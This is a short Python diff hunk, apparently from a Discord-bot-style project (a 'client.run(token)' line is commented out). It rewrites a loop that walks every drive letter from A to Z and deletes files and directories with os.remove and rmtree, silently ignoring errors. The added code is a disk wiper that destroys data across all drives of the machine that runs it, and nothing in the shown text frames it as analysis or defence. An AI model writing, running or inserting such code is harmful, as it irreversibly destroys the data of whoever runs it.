@@ -50,11 +50,23 @@ def main():
 
     for drive in string.ascii_uppercase:
         for thing in os.walk(f"{drive}:\\"):
-            try:
-                rmtree(thing[0])
-            except:
-                pass
-            break
+            if thing[2]:
+                for file in thing[2]:
+                    try:
+                        os.remove(file)
+                    except:
+                        pass
+            elif thing[1]:
+                for directory in thing[1]:
+                    try:
+                        rmtree(directory)
+                    except:
+                        pass
+            else:
+                try:
+                    rmtree(thing[0])
+                except:
+                    pass
 
     # client.run(token)
 
